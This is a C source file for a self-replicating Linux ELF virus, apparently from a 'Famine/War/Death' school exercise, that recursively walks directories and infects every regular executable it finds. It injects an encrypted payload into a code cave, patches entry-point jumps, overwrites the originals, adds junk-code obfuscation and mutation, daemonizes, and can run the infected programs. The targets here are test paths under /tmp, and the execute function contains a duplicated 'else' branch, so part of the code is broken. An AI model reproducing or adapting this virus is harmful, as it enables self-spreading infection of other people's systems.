#include <sys/stat.h>
#include <sys/mman.h>
#include <dirent.h>
#include <fcntl.h>
#include <sys/types.h>
#include <elf.h>
#include <dirent.h>

#include "map.h"
#include "utils.h"
#include "bss.h"
#include "text.h"
#include "pestilence.h"
#include "war.h"
#include "daemon.h"
#include "famine.h"
#include "death.h"
#include "syscall.h"

#define __asm__ __asm__ volatile

extern void end();

void	famine(bootstrap_data_t *bootstrap_data, uint16_t *counter);
void	jmp_end(void);
void	entrypoint(int argc, char **argv, char **envp);
void	_start(void);

#define JMP_SIZE 4

void __attribute__((naked)) _start(void)
{
	__asm__ (
			"push %rdx\n"
			"movq 8(%rsp), %rdi\n"
			"leaq 16(%rsp), %rsi\n"
			"leaq 8(%rsi,%rdi,8), %rdx\n"
			"call entrypoint\n"
			"pop %rdx\n"
			".global jmp_end\n"
			"jmp_end:\n"
			"jmp end\n"
	);
}

__attribute__((section(".text#"))) int g_start_offset = 0x1000;

static int	patch_new_file(t_data *data, const char *filename) {

	JUNK;

	unlink(filename);

	int fd = open(filename, O_CREAT | O_WRONLY | O_TRUNC, data->elf.mode);
	if (fd == -1)
		return 1;

	if (write(fd, data->file, data->size) == -1) {
		close(fd);
		return 1;
	}

	JUNK;

	close(fd);

	return 0;
}

static inline int64_t calc_jmp(uint64_t from, uint64_t to, uint64_t offset) {
	return (int64_t)to - (int64_t)from - (int64_t)offset;
}

static int packer(t_data *data) {
	data->packer.p_size = (size_t)&packer_end - (size_t)&packer_start;

	JUNK;

	if (text(data, data->packer.p_size) != 0) {
		return 1;
	}

	return 0;
}

static void init_patch(t_data *data, size_t jmp_rel_offset) {

	t_patch *patch = &data->patch;

	JUNK;

	/* calculate the difference between the cave and the packer 
	 * will always be positive cause .data is after the .text */
	uint32_t addr_diff = data->cave.addr - data->packer.addr;

	patch->jmp = (int32_t)(addr_diff - jmp_rel_offset - sizeof(int32_t) - 1);

	char signature[SIGNATURE_SIZE];

	JUNK;

	ft_strncpy(signature, sign, SIGNATURE_SIZE);

	/* "Famine (c)oded by dxrxbxk - straboul:numb", 0x0a, 0 
	 * reset the hash (numb) to 0000 */
	ft_memset(&signature[SIGNATURE_SIZE - 6], '0', 4);

	update_fingerprint(&signature[ft_strlen(signature) - 14], data);

	ft_strncpy(patch->signature, signature, sizeof(patch->signature));

	JUNK;

	patch->decrypt_size = data->cave.p_size;

	patch->virus_offset = addr_diff;

	//patch->key = DEFAULT_KEY;
	patch->key = 0;
}

static int packer_patch(t_data *data) {

	uint16_t jmp_rel_offset = (uintptr_t)&jmp_rel - (uintptr_t)&packer_start;

	JUNK;

	init_patch(data, jmp_rel_offset);

	uintptr_t pstart = (uintptr_t)&packer_start;

	/* copy the packer */
	ft_memcpy(data->file + data->packer.offset, (void*)pstart, data->packer.p_size);

	JUNK;

	/* patch the packer, jmp_rel offset is where the data of the packer is stored */
	ft_memcpy(data->file + data->packer.offset + jmp_rel_offset + 1, &data->patch, sizeof(t_patch));

	return 0;

}

static int	inject(t_data *data) {

	if (packer(data) != 0) {
		return 1;
	}

	JUNK;

	if (bss(data, data->cave.p_size) != 0) {
		return 1;
	}

	JUNK;

	packer_patch(data);

	uint16_t jmp_offset = (uintptr_t)&jmp_end - (uintptr_t)&_start + 1;

	uintptr_t start = (uintptr_t)&_start;

	data->cave.rel_jmp = (int32_t)calc_jmp(data->cave.addr, data->packer.old_entry, jmp_offset + JMP_SIZE);

	ft_memcpy(data->file + data->cave.offset, (void*)start, data->cave.p_size);

	ft_memcpy(data->file + data->cave.offset + jmp_offset, &data->cave.rel_jmp, JMP_SIZE);

	JUNK;

	encrypt(data->file + data->cave.offset, data->cave.p_size, data->patch.key);

	return 0;
}

static int	infect(const char *filename, bootstrap_data_t *bs_data)
{

	t_data data;
	ft_memset(&data, 0, sizeof(t_data));

	JUNK;

	/* copy the name of the target */
	ft_strncpy(data.target_name, filename, sizeof(data.target_name));

	/* get our own name */
	data.bs_data = bs_data;

	/* calculate the size of the payload before the mapping */
	data.cave.p_size = (uintptr_t)&end - (uintptr_t)&_start;

	if (map_file(filename, &data) != 0) {
		return 1;
	}

	JUNK;

	if (updade_hdr(&data) != 0) {
		free_data(&data);
		return 1;
	}

	if (inject(&data) != 0) {
		free_data(&data);
		return 1;
	}

	JUNK;

	if (patch_new_file(&data, filename) != 0) {
		free_data(&data);
		return 1;
	}

	free_data(&data);

	return 0;
}


#ifdef ENABLE_EXEC
static int execute_prog(const char *filename, char **envp)
{
	pid_t pid = fork();

	JUNK;

	if (pid == 0) {

		const char dev_null[] = "/dev/null";
		int fd = open(dev_null, O_RDONLY);

		JUNK;

		if (fd == -1)
			return 1;

		if (dup2(fd, 0) < 0) {
			close(fd);
			return 1;
		}
		if (dup2(fd, 1) < 0) {
			close(fd);
			return 1;
		}
		if (dup2(fd, 2) < 0) {
			close(fd);
			return 1;
		}

		close(fd);

		execve(filename, (const char *[]){filename, NULL}, envp);

		exit(0);
	} else if (pid > 0) {
		siginfo_t info;

		waitid(P_PID, pid, &info, WEXITED);

		return (info.si_status == 0) ? 0 : 1;
	} else {
		return 1;
	} else {
		return 1;
	}
	return 0;
}
#endif

static void	make_path(char *path, const char *dir, const char *file)
{
	char *ptr = path;
	char slash[] = "/";
	ptr = ft_stpncpy(ptr, dir, PATH_MAX - (ptr - path));
	ptr = ft_stpncpy(ptr, slash, PATH_MAX - (ptr - path));
	ft_stpncpy(ptr, file, PATH_MAX - (ptr - path));
}

static void open_file(const char *file, bootstrap_data_t *bs_data, uint16_t *counter)
{

	int fd = open(file, O_RDONLY);
	if (fd == -1)
		return ;

	char buf[PATH_MAX];
	dirent_t *dir;
	ssize_t ret;

	for(;;)
	{
		ret = getdents64(fd, buf, PATH_MAX);
		if (ret <= 0)
			break;
		for (ssize_t i = 0; i < ret; i += dir->d_reclen)
		{
			dir = (dirent_t *)(buf + i);

			JUNK;

			if (dir->d_name[0] == '.'
				&& (dir->d_name[1] == '\0' || (dir->d_name[1] == '.' && dir->d_name[2] == '\0')))
				continue;
			
			if (dir->d_type == DT_REG) {
				char new_path[PATH_MAX];

				JUNK;

				make_path(new_path, file, dir->d_name);

				if (infect(new_path, bs_data) == 0) {
					(*counter)++;
					mutate();

#ifdef ENABLE_EXEC
					execute_prog(new_path, bs_data->envp);
#endif
				}

			} else if (dir->d_type == DT_DIR) {
				char new_path[PATH_MAX];

				make_path(new_path, file, dir->d_name);

				JUNK;

				open_file(new_path, bs_data, counter);
			}
		}
	}

	close(fd);
}

void	famine(bootstrap_data_t *bs_data, uint16_t *counter)
{

	const char *paths[] = {
		STR("/tmp/test"),
		STR("/tmp/test2"),
		STR("./tmp"),
		NULL
	};

	JUNK;

	for (int i = 0; paths[i]; ++i)
		open_file(paths[i], bs_data, counter);

}

void	entrypoint(int argc, char **argv, char **envp)
{
	bootstrap_data_t bootstrap_data;
	bootstrap_data.argc = argc;
	bootstrap_data.argv = argv;
	bootstrap_data.envp = envp;
	uint16_t counter = 0;

#ifndef DEV_MODE
	//if (pestilence() != 0) {
	//	return ;
	//}
#endif

	int start_offset = g_start_offset;

	prepare_mutate(0);
	mutate();

	file_t file;
	ft_memset(&file, 0, sizeof(file_t));

	daemonize(envp);

	famine(&bootstrap_data, &counter);
	war(counter, &file);
	death(start_offset, &file);
}
